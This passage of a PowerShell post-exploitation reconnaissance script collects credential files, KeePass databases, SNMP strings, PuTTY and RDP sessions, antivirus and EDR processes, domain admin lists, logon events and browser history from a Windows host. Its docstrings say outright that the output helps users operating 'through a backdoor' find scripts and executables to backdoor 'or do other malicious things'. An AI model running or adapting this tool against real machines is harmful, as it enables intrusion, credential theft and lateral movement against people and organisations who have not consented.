    New-Object -TypeName PSobject -Property @{
        Standard    = If ((Get-ItemProperty $regkey\StandardProfile).EnableFirewall -eq 1){"Enabled"}Else {"Disabled"}
        Domain      = If ((Get-ItemProperty $regkey\DomainProfile).EnableFirewall -eq 1){"Enabled"}Else {"Disabled"}
        Public      = If ((Get-ItemProperty $regkey\PublicProfile).EnableFirewall -eq 1){"Enabled"}Else {"Disabled"}
    }
}
    
function Get-InterestingRegistryKeys {
<#
.SYNOPSIS

Pulls potentially interesting registry keys
 
#>
    Write-Verbose "Enumerating registry keys..."            
    
    # Recently typed "run" commands
    "`n[+] Recent RUN Commands:`n"
    Get-Itemproperty "HKCU:\software\microsoft\windows\currentversion\explorer\runmru" | Out-String

    # HKLM SNMP Keys
    "`n[+] SNMP community strings:`n"
    Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" | Format-Table -auto | Out-String
    
    # HKCU SNMP Keys 
    "`n[+] SNMP community strings for current user:`n"
    Get-ItemProperty "HKCU:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities"| Format-Table -auto |Out-String
    
    # Putty Saved Session Keys
    "`n[+] Putty saved sessions:`n"
    Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\*" |Format-Table -auto | Out-String
    
}

function Get-IndexedFiles {
<#
.SYNOPSIS

Uses the Windows indexing service to search for interesting files and often includes Outlook e-mails.
Code originally adapted from a Microsoft post, but can no longer locate the exact source. Doesn't work on all systems.

#>
param (
    [Parameter(Mandatory=$true)][string]$Pattern)  

    if($Path -eq ""){$Path = $PWD;} 

    $pattern = $pattern -replace "\*", "%"  
    $path = $path + "\%"

    $con = New-Object -ComObject ADODB.Connection
    $rs = New-Object -ComObject ADODB.Recordset

    # This directory indexing search doesn't work on some systems tested (i.e.Server 2K8r2)
    # Using Try/Catch to break the search in case the provider isn't available
    Try {
        $con.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")}
    Catch {
        "[-] Indexed file search provider not available";Break
    }
    $rs.Open("SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE '" + $pattern + "' " , $con)

    While(-Not $rs.EOF){
        $rs.Fields.Item("System.ItemPathDisplay").Value
        $rs.MoveNext()
    }
}

function Get-InterestingFiles {
<#
.SYNOPSIS

Local filesystem enumeration

#>
    Write-Verbose "Enumerating interesting files..."

    # Get Indexed files containg $searchStrings (Experimental), edit this to desired list of "dirty words"
    $SearchStrings = "*secret*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora"
    $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}
    
    "`n[+] Indexed File Search:`n"
    "`n[+] Search Terms ($SearchStrings)`n`n"
    $IndexedFiles |Format-List |Out-String
    
    # Get Top Level file listing of all drives
    "`n[+] All 'FileSystem' Drives - Top Level Listing:`n"
    Get-PSdrive -psprovider filesystem |ForEach-Object {gci $_.Root} |Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String
    
    # Get Program Files
    "`n[+] System Drive - Program Files:`n"
    GCI "$ENV:ProgramFiles\" | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String
    
    # Get Program Files (x86)
    "`n[+] System Drive - Program Files (x86):`n"
    GCI "$ENV:ProgramFiles (x86)\" | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String
    
    # Get %USERPROFILE%\Desktop top level file listing
    "`n[+] Current User Desktop:`n"
    GCI $ENV:USERPROFILE\Desktop | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String
    
    # Get %USERPROFILE%\Documents top level file listing
    "`n[+] Current User Documents:`n"
    GCI $ENV:USERPROFILE\Documents | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String
    
    # Get Files in the %USERPROFILE% directory with certain extensions or phrases
    "`n[+] Current User Profile (*pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.key,KeePass.config):`n"
    GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String
    
    # Get Host File
    "`n[+] Contents of Hostfile:`n`n"
    (Get-Content -path "$($ENV:WINDIR)\System32\drivers\etc\hosts") -join "`r`n"
}

function Get-RecycleBin {
<#
.SYNOPSIS

Gets the contents of the Recycle Bin for the current user

#>  
    Write-Verbose "Enumerating deleted files in Recycle Bin..."
    Try {
        $Shell = New-Object -ComObject Shell.Application
        $Recycler = $Shell.NameSpace(0xa)
        If (($Recycler.Items().Count) -gt 0) {
            $Output += $Recycler.Items() | Sort ModifyDate -Descending | Select-Object Name, Path, ModifyDate, Size, Type
        }
        Else {
            Write-Verbose "No deleted items found in Recycle Bin!`n"
        }
    }
    Catch {Write-Verbose "[-] Error getting deleted items from Recycle Bin! $($Error[0])`n"}
    
    Return $Output
}

function Get-AVInfo {
<#
.SYNOPSIS

    Gets the installed AV product and current status

#>
    Write-Verbose "Enumerating installed AV product..."

    $AntiVirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct  -ComputerName $env:computername

    switch ($AntiVirusProduct.productState) { 
        "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"} 
        "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"} 
        "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"} 
        "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"} 
        "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"} 
        "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"} 
        "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"} 
        "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"} 
        "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"} 
        "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"} 
        "397568" {$defstatus = "Up to date"; $rtstatus = "Enabled"}
        "393472" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
    default {$defstatus = "Unknown" ;$rtstatus = "Unknown"} 
    }
    
    # Create hash-table
    $ht = @{}
    $ht.Computername = $env:computername
    $ht.Name = $AntiVirusProduct.displayName
    $ht.'Product GUID' = $AntiVirusProduct.instanceGuid
    $ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe
    $ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe
    $ht.'Definition Status' = $defstatus
    $ht.'Real-time Protection Status' = $rtstatus

    # Convert to PS object and then format as a string for file output
    $Output = New-Object -TypeName PSObject -Property $ht #|Format-List
    
    Return $Output
}

function Get-McafeeLogs {
<#
.SYNOPSIS

    Searches Application log for "McLogEvent" Provider associated with McAfee AV products and selects the first 50 events from the last 14 days

#>
    Write-Verbose "Enumerating Mcafee AV events..."
    # Get events from the last two weeks
    $date = (get-date).AddDays(-14)
    $ProviderName = "McLogEvent"
    # Try to get McAfee AV event logs
    Try {
        $McafeeLogs = Get-WinEvent -FilterHashTable @{ logname = "Application"; StartTime = $date; ProviderName = $ProviderName; }
        $McafeeLogs |Select-Object -First 50 ID, Providername, DisplayName, TimeCreated, Level, UserID, ProcessID, Message
    }
    Catch {
        Write-Verbose "[-] Error getting McAfee AV event logs! $($Error[0])`n"
    }
}
    
function Get-AVProcesses {
<#
.SYNOPSIS
    
    Returns suspected AV processes based on name matching
    
    AV process list adapted from Beau Bullock's HostRecon AV detection code
    https://raw.githubusercontent.com/dafthack/HostRecon/master/HostRecon.ps1

#>
    Write-Verbose "Enumerating potential AV processes..."
    $processes = Get-Process
    
    $avlookuptable = @{
                #explorer                   = "Explorer (testing)"
                mcshield                    = "McAfee AV"
                windefend                   = "Windows Defender AV"
                MSASCui                     = "Windows Defender AV"
                msmpeng                     = "Windows Defender AV"
                msmpsvc                     = "Windows Defender AV"
                WRSA                        = "WebRoot AV"
                savservice                  = "Sophos AV"
                TMCCSF                      = "Trend Micro AV"
                "symantec antivirus"        = "Symantec AV"
                mbae                        = "MalwareBytes Anti-Exploit"
                parity                      = "Bit9 application whitelisting"
                cb                          = "Carbon Black behavioral analysis"
                "bds-vision"                = "BDS Vision behavioral analysis"
                Triumfant                   = "Triumfant behavioral analysis"
                CSFalcon                    = "CrowdStrike Falcon EDR"
                ossec                       = "OSSEC intrusion detection"
                TmPfw                       = "Trend Micro firewall"
                dgagent                     = "Verdasys Digital Guardian DLP"
                kvoop                       = "Unknown DLP process"
            }
            
    ForEach ($process in $processes) {
            ForEach ($key in $avlookuptable.keys){
            
                if ($process.ProcessName -match $key){
                    New-Object -TypeName PSObject -Property @{
                        AVProduct   = ($avlookuptable).Get_Item($key)
                        ProcessName = $process.ProcessName
                        PID         = $process.ID
                        }
                }
            }
    }
}
    
function Get-DomainAdmins {
<#
.SYNOPSIS

Enumerates admininistrator type accounts within the domain using code adapted from Dafthack HostRecon.ps1

#>  
    Write-Verbose "Enumerating Domain Administrators..."
    $Domain = [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()
            
    Try {
        $DAgroup = ([adsi]"WinNT://$domain/Domain Admins,group")
        $Members = @($DAgroup.psbase.invoke("Members"))
        [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
        "`n[+] Domain Admins:`n"
        $MemberNames

        $EAgroup = ([adsi]"WinNT://$domain/Enterprise Admins,group")
        $Members = @($EAgroup.psbase.invoke("Members"))
        [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
        "`n[+] Enterprise Admins:`n"
        $MemberNames
        
        $SAgroup = ([adsi]"WinNT://$domain/Schema Admins,group")
        $Members = @($DAgroup.psbase.invoke("Members"))
        [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
        "`n[+] Schema Admins:`n"
        $MemberNames
    }
    Catch {
        Write-Verbose "[-] Error connecting to the domain while retrieving group members."    
    }
}

function Get-DomainAccountPolicy {
<#
.SYNOPSIS

Enumerates account policy from the domain with code adapted from Dafthack HostRecon.ps1

#>  

Write-Verbose "Enumerating domain account policy"
$Domain = [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()

    Try {
        $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$domain)
        $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
        $CurrentDomain = [ADSI]"WinNT://$env:USERDOMAIN"
        $Name = @{Name="DomainName";Expression={$_.Name}}
        $MinPassLen = @{Name="Minimum Password Length";Expression={$_.MinPasswordLength}}
        $MinPassAge = @{Name="Minimum Password Age (Days)";Expression={$_.MinPasswordAge.value/86400}}
        $MaxPassAge = @{Name="Maximum Password Age (Days)";Expression={$_.MaxPasswordAge.value/86400}}
        $PassHistory = @{Name="Enforce Password History (Passwords remembered)";Expression={$_.PasswordHistoryLength}}
        $AcctLockoutThreshold = @{Name="Account Lockout Threshold";Expression={$_.MaxBadPasswordsAllowed}}
        $AcctLockoutDuration =  @{Name="Account Lockout Duration (Minutes)";Expression={if ($_.AutoUnlockInterval.value -eq -1) {'Account is locked out until administrator unlocks it.'} else {$_.AutoUnlockInterval.value/60}}}
        $ResetAcctLockoutCounter = @{Name="Observation Window";Expression={$_.LockoutObservationInterval.value/60}}
        
        $CurrentDomain | Select-Object $Name,$MinPassLen,$MinPassAge,$MaxPassAge,$PassHistory,$AcctLockoutThreshold,$AcctLockoutDuration,$ResetAcctLockoutCounter
    }
    Catch {
            Write-Verbose "[-] Error connecting to the domain while retrieving password policy."    
    }
}
    
# PowerSploit Functions with modifications

function Get-ComputerDetails {
<#
.SYNOPSIS

This script is used to get useful information from a computer.

Function: Get-ComputerDetails
Author: Joe Bialek, Twitter: @JosephBialek
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

This script is used to get useful information from a computer. Currently, the script gets the following information:
-Explicit Credential Logons (Event ID 4648)
-Logon events (Event ID 4624)
-AppLocker logs to find what processes are created
-PowerShell logs to find PowerShell scripts which have been executed
-RDP Client Saved Servers, which indicates what servers the user typically RDP's in to

.PARAMETER ToString

Switch: Outputs the data as text instead of objects, good if you are using this script through a backdoor.
    
.EXAMPLE

Get-ComputerDetails
Gets information about the computer and outputs it as PowerShell objects.

Get-ComputerDetails -ToString
Gets information about the computer and outputs it as raw text.

.NOTES
This script is useful for fingerprinting a server to see who connects to this server (from where), and where users on this server connect to. 
You can also use it to find Powershell scripts and executables which are typically run, and then use this to backdoor those files.

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell

#>

    Param(
        [Parameter(Position=0)]
        [Switch]
        $ToString
    )
    Write-Verbose "Enumerating Event Logs for interesting entries (Get-ComputerDetails)..."

    # Added Try/Catch to prevent parent from exiting if we don't have rights to read the security log. -EA preferences didn't make a difference.
    # This was only an issue when executed through Empire
    Try {
        $SecurityLog = Get-EventLog -LogName Security
        $Filtered4624 = Find-4624Logons $SecurityLog
        $Filtered4648 = Find-4648Logons $SecurityLog
    }
    Catch{}
    
    $AppLockerLogs = Find-AppLockerLogs
    $PSLogs = Find-PSScriptsInPSAppLog
    $RdpClientData = Find-RDPClientConnections

    if ($ToString)
    {
        Write-Output "`nEvent ID 4624 (Logon):"
        Write-Output $Filtered4624.Values
        Write-Output "`nEvent ID 4648 (Explicit Credential Logon):"
        Write-Output $Filtered4648.Values
        Write-Output "`nAppLocker Process Starts:"
        Write-Output $AppLockerLogs.Values
        Write-Output "`nPowerShell Script Executions:"
        Write-Output $PSLogs.Values
        Write-Output "`nRDP Client Data:"
        Write-Output $RdpClientData.Values
    }
    else
    {
        $Properties = @{
            LogonEvent4624 = $Filtered4624.Values
            LogonEvent4648 = $Filtered4648.Values
            AppLockerProcessStart = $AppLockerLogs.Values
            PowerShellScriptStart = $PSLogs.Values
            RdpClientData = $RdpClientData.Values
        }

        $ReturnObj = New-Object PSObject -Property $Properties
        return $ReturnObj
    }
}


function Find-4648Logons
{
<#
.SYNOPSIS

Retrieve the unique 4648 logon events. This will often find cases where a user is using remote desktop to connect to another computer. It will give the 
the account that RDP was launched with and the account name of the account being used to connect to the remote computer. This is useful
for identifying normal authenticaiton patterns. Other actions that will trigger this include any runas action.

Function: Find-4648Logons
Author: Joe Bialek, Twitter: @JosephBialek
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Retrieve the unique 4648 logon events. This will often find cases where a user is using remote desktop to connect to another computer. It will give the 
the account that RDP was launched with and the account name of the account being used to connect to the remote computer. This is useful
for identifying normal authenticaiton patterns. Other actions that will trigger this include any runas action.

.EXAMPLE

Find-4648Logons
Gets the unique 4648 logon events.

.NOTES

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell
#>
    Param(
        $SecurityLog
    )

    $ExplicitLogons = $SecurityLog | Where {$_.InstanceID -eq 4648}
    $ReturnInfo = @{}

    foreach ($ExplicitLogon in $ExplicitLogons)
    {
        $Subject = $false
        $AccountWhosCredsUsed = $false
        $TargetServer = $false
        $SourceAccountName = ""
        $SourceAccountDomain = ""
        $TargetAccountName = ""
        $TargetAccountDomain = ""
        $TargetServer = ""
        foreach ($line in $ExplicitLogon.Message -split "\r\n")
        {
            if ($line -cmatch "^Subject:$")
            {
                $Subject = $true
            }
            elseif ($line -cmatch "^Account\sWhose\sCredentials\sWere\sUsed:$")
            {
                $Subject = $false
                $AccountWhosCredsUsed = $true
            }
            elseif ($line -cmatch "^Target\sServer:")
            {
                $AccountWhosCredsUsed = $false
                $TargetServer = $true
            }
            elseif ($Subject -eq $true)
            {
                if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
                {
                    $SourceAccountName = $Matches[1]
                }
                elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
                {
                    $SourceAccountDomain = $Matches[1]
                }
            }
            elseif ($AccountWhosCredsUsed -eq $true)
            {
                if ($line -cmatch "\s+Account\sName:\s+(\S.*)")
                {
                    $TargetAccountName = $Matches[1]
                }
                elseif ($line -cmatch "\s+Account\sDomain:\s+(\S.*)")
                {
                    $TargetAccountDomain = $Matches[1]
                }
            }
            elseif ($TargetServer -eq $true)
            {
                if ($line -cmatch "\s+Target\sServer\sName:\s+(\S.*)")
                {
                    $TargetServer = $Matches[1]
                }
            }
        }

        #Filter out logins that don't matter
        if (-not ($TargetAccountName -cmatch "^DWM-.*" -and $TargetAccountDomain -cmatch "^Window\sManager$"))
        {
            $Key = $SourceAccountName + $SourceAccountDomain + $TargetAccountName + $TargetAccountDomain + $TargetServer
            if (-not $ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    LogType = 4648
                    LogSource = "Security"
                    SourceAccountName = $SourceAccountName
                    SourceDomainName = $SourceAccountDomain
                    TargetAccountName = $TargetAccountName
                    TargetDomainName = $TargetAccountDomain
                    TargetServer = $TargetServer
                    Count = 1
                    #Times = @($ExplicitLogon.TimeGenerated)
                }

                $ResultObj = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $ResultObj)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                #$ReturnInfo[$Key].Times += ,$ExplicitLogon.TimeGenerated
            }
        }
    }

    return $ReturnInfo
}

function Find-4624Logons
{
<#
.SYNOPSIS

Find all unique 4624 Logon events to the server. This will tell you who is logging in and how. You can use this to figure out what accounts do
network logons in to the server, what accounts RDP in, what accounts log in locally, etc...

Function: Find-4624Logons
Author: Joe Bialek, Twitter: @JosephBialek
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Find all unique 4624 Logon events to the server. This will tell you who is logging in and how. You can use this to figure out what accounts do
network logons in to the server, what accounts RDP in, what accounts log in locally, etc...

.EXAMPLE

Find-4624Logons
Find unique 4624 logon events.

.NOTES

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell
#>
    Param (
        $SecurityLog
    )

    $Logons = $SecurityLog | Where {$_.InstanceID -eq 4624}
    $ReturnInfo = @{}

    foreach ($Logon in $Logons)
    {
        $SubjectSection = $false
        $NewLogonSection = $false
        $NetworkInformationSection = $false
        $AccountName = ""
        $AccountDomain = ""
        $LogonType = ""
        $NewLogonAccountName = ""
        $NewLogonAccountDomain = ""
        $WorkstationName = ""
        $SourceNetworkAddress = ""
        $SourcePort = ""

        foreach ($line in $Logon.Message -Split "\r\n")
        {
            if ($line -cmatch "^Subject:$")
            {
                $SubjectSection = $true
            }
            elseif ($line -cmatch "^Logon\sType:\s+(\S.*)")
            {
                $LogonType = $Matches[1]
            }
            elseif ($line -cmatch "^New\sLogon:$")
            {
                $SubjectSection = $false
                $NewLogonSection = $true
            }
            elseif ($line -cmatch "^Network\sInformation:$")
            {
                $NewLogonSection = $false
                $NetworkInformationSection = $true
            }
            elseif ($SubjectSection)
            {
                if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
                {
                    $AccountName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
                {
                    $AccountDomain = $Matches[1]
                }
            }
            elseif ($NewLogonSection)
            {
                if ($line -cmatch "^\s+Account\sName:\s+(\S.*)")
                {
                    $NewLogonAccountName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Account\sDomain:\s+(\S.*)")
                {
                    $NewLogonAccountDomain = $Matches[1]
                }
            }
            elseif ($NetworkInformationSection)
            {
                if ($line -cmatch "^\s+Workstation\sName:\s+(\S.*)")
                {
                    $WorkstationName = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Source\sNetwork\sAddress:\s+(\S.*)")
                {
                    $SourceNetworkAddress = $Matches[1]
                }
                elseif ($line -cmatch "^\s+Source\sPort:\s+(\S.*)")
                {
                    $SourcePort = $Matches[1]
                }
            }
        }

        #Filter out logins that don't matter
        if (-not ($NewLogonAccountDomain -cmatch "NT\sAUTHORITY" -or $NewLogonAccountDomain -cmatch "Window\sManager"))
        {
            $Key = $AccountName + $AccountDomain + $NewLogonAccountName + $NewLogonAccountDomain + $LogonType + $WorkstationName + $SourceNetworkAddress + $SourcePort
            if (-not $ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    LogType = 4624
                    LogSource = "Security"
                    SourceAccountName = $AccountName
                    SourceDomainName = $AccountDomain
                    NewLogonAccountName = $NewLogonAccountName
                    NewLogonAccountDomain = $NewLogonAccountDomain
                    LogonType = $LogonType
                    WorkstationName = $WorkstationName
                    SourceNetworkAddress = $SourceNetworkAddress
                    SourcePort = $SourcePort
                    Count = 1
                    #Times = @($Logon.TimeGenerated)
                }

                $ResultObj = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $ResultObj)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                #$ReturnInfo[$Key].Times += ,$Logon.TimeGenerated
            }
        }
    }

    return $ReturnInfo
}


function Find-AppLockerLogs
{
<#
.SYNOPSIS

Look through the AppLocker logs to find processes that get run on the server. You can then backdoor these exe's (or figure out what they normally run).

Function: Find-AppLockerLogs
Author: Joe Bialek, Twitter: @JosephBialek
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Look through the AppLocker logs to find processes that get run on the server. You can then backdoor these exe's (or figure out what they normally run).

.EXAMPLE

Find-AppLockerLogs
Find process creations from AppLocker logs.

.NOTES

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell
#>
    $ReturnInfo = @{}

    $AppLockerLogs = Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -ErrorAction SilentlyContinue | Where {$_.Id -eq 8002}

    foreach ($Log in $AppLockerLogs)
    {
        $SID = New-Object System.Security.Principal.SecurityIdentifier($Log.Properties[7].Value)
        $UserName = $SID.Translate( [System.Security.Principal.NTAccount])

        $ExeName = $Log.Properties[10].Value

        $Key = $UserName.ToString() + "::::" + $ExeName

        if (!$ReturnInfo.ContainsKey($Key))
        {
            $Properties = @{
                Exe = $ExeName
                User = $UserName.Value
                Count = 1
                Times = @($Log.TimeCreated)
            }

            $Item = New-Object PSObject -Property $Properties
            $ReturnInfo.Add($Key, $Item)
        }
        else
        {
            $ReturnInfo[$Key].Count++
            $ReturnInfo[$Key].Times += ,$Log.TimeCreated
        }
    }

    return $ReturnInfo
}


function Find-PSScriptsInPSAppLog
{
<#
.SYNOPSIS

Go through the PowerShell operational log to find scripts that run (by looking for ExecutionPipeline logs eventID 4100 in PowerShell app log).
You can then backdoor these scripts or do other malicious things.

Function: Find-AppLockerLogs
Author: Joe Bialek, Twitter: @JosephBialek
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Go through the PowerShell operational log to find scripts that run (by looking for ExecutionPipeline logs eventID 4100 in PowerShell app log).
You can then backdoor these scripts or do other malicious things.

.EXAMPLE

Find-PSScriptsInPSAppLog
Find unique PowerShell scripts being executed from the PowerShell operational log.

.NOTES

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell
#>
    $ReturnInfo = @{}
    $Logs = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -ErrorAction SilentlyContinue | Where {$_.Id -eq 4100}

    foreach ($Log in $Logs)
    {
        $ContainsScriptName = $false
        $LogDetails = $Log.Message -split "`r`n"

        $FoundScriptName = $false
        foreach($Line in $LogDetails)
        {
            if ($Line -imatch "^\s*Script\sName\s=\s(.+)")
            {
                $ScriptName = $Matches[1]
                $FoundScriptName = $true
            }
            elseif ($Line -imatch "^\s*User\s=\s(.*)")
            {
                $User = $Matches[1]
            }
        }

        if ($FoundScriptName)
        {
            $Key = $ScriptName + "::::" + $User

            if (!$ReturnInfo.ContainsKey($Key))
            {
                $Properties = @{
                    ScriptName = $ScriptName
                    UserName = $User
                    Count = 1
                    Times = @($Log.TimeCreated)
                }

                $Item = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $Item)
            }
            else
            {
                $ReturnInfo[$Key].Count++
                $ReturnInfo[$Key].Times += ,$Log.TimeCreated
            }
        }
    }

    return $ReturnInfo
}


function Find-RDPClientConnections
{
<#
.SYNOPSIS

Search the registry to find saved RDP client connections. This shows you what connections an RDP client has remembered, indicating what servers the user 
usually RDP's to.

Function: Find-RDPClientConnections
Author: Joe Bialek, Twitter: @JosephBialek
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Search the registry to find saved RDP client connections. This shows you what connections an RDP client has remembered, indicating what servers the user 
usually RDP's to.

.EXAMPLE

Find-RDPClientConnections
Find unique saved RDP client connections.

.NOTES

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell
#>
    $ReturnInfo = @{}

    $Null = New-PSDrive -Name HKU -PSProvider Registry -Root Registry::HKEY_USERS -ErrorAction SilentlyContinue

    #Attempt to enumerate the servers for all users
    $Users = Get-ChildItem -Path "HKU:\"
    foreach ($UserSid in $Users.PSChildName)
    {
        $Servers = Get-ChildItem "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue

        foreach ($Server in $Servers)
        {
            $Server = $Server.PSChildName
            $UsernameHint = (Get-ItemProperty -Path "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers\$($Server)").UsernameHint
                
            $Key = $UserSid + "::::" + $Server + "::::" + $UsernameHint

            if (!$ReturnInfo.ContainsKey($Key))
            {
                $SIDObj = New-Object System.Security.Principal.SecurityIdentifier($UserSid)
                $User = ($SIDObj.Translate([System.Security.Principal.NTAccount])).Value

                $Properties = @{
                    CurrentUser = $User
                    Server = $Server
                    UsernameHint = $UsernameHint
                }

                $Item = New-Object PSObject -Property $Properties
                $ReturnInfo.Add($Key, $Item)
            }
        }
    }

    return $ReturnInfo
}

# End PowerSploit Functions

function Get-BrowserInformation {
<#
    .SYNOPSIS

        Dumps Browser Information
        Author: @424f424f
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
        https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1

    .DESCRIPTION

        Enumerates browser history or bookmarks for a Chrome, Internet Explorer,
        and/or Firefox browsers on Windows machines.

    .PARAMETER Browser

        The type of browser to enumerate, 'Chrome', 'IE', 'Firefox' or 'All'

    .PARAMETER Datatype

        Type of data to enumerate, 'History' or 'Bookmarks'

    .PARAMETER UserName

        Specific username to search browser information for.

    .PARAMETER Search

        Term to search for

    .EXAMPLE

        PS C:\> Get-BrowserInformation

        Enumerates browser information for all supported browsers for all current users.

    .EXAMPLE

        PS C:\> Get-BrowserInformation -Browser IE -Datatype Bookmarks -UserName user1

        Enumerates bookmarks for Internet Explorer for the user 'user1'.

    .EXAMPLE

        PS C:\> Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'

        Enumerates bookmarks for Internet Explorer for the user 'user1' and only returns
        results matching the search term 'github'.
#>
    [CmdletBinding()]
    Param
    (
        [Parameter(Position = 0)]
        [String[]]
        [ValidateSet('Chrome','IE','FireFox', 'All')]
        $Browser = 'All',

        [Parameter(Position = 1)]
        [String[]]
        [ValidateSet('History','Bookmarks','All')]
        $DataType = 'All',

        [Parameter(Position = 2)]
        [String]
        $UserName = '',

        [Parameter(Position = 3)]
        [String]
        $Search = ''
    )

    Write-Verbose "Enumerating web browser history..."

    function ConvertFrom-Json20([object] $item){
        #http://stackoverflow.com/a/29689642
        Add-Type -AssemblyName System.Web.Extensions
        $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
        return ,$ps_js.DeserializeObject($item)
        
    }

    function Get-ChromeHistory {
        $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"
        if (-not (Test-Path -Path $Path)) {
            Write-Verbose "[-] Could not find Chrome History for username: $UserName"
        }
        $Regex = '(http|ftp|https|file)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?'
        $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"|Select-String -AllMatches $regex |% {$_.Matches}
        $Value | ForEach-Object {
            $Key = $_
            if ($Key -match $Search){
                New-Object -TypeName PSObject -Property @{
                    User = $UserName
                    Browser = 'Chrome'
                    DataType = 'History'
                    Data = $_.Value
                }
            }
        }        
    }

    function Get-ChromeBookmarks {
    $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    if (-not (Test-Path -Path $Path)) {
        Write-Verbose "[-] Could not find Chrome Bookmarks for username: $UserName"
    }   else {
            $Json = Get-Content $Path
            $Output = ConvertFrom-Json20($Json)
            $Jsonobject = $Output.roots.bookmark_bar.children
            # Modified parsing to properly iterate of the array of dictionaries
            $JsonObject | ForEach-Object {
                New-Object -TypeName PSObject -Property @{
                    User = $UserName
                    Browser = 'Chrome'
                    DataType = 'Bookmark'
                    Data = $_.item('url')
                    Name = $_.item('name')
                }
            }
        }
    }

    function Get-InternetExplorerHistory {
        #https://crucialsecurityblog.harris.com/2011/03/14/typedurls-part-1/

        $Null = New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS -ErrorAction SilentlyContinue
        $Paths = Get-ChildItem 'HKU:\' -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

        ForEach($Path in $Paths) {

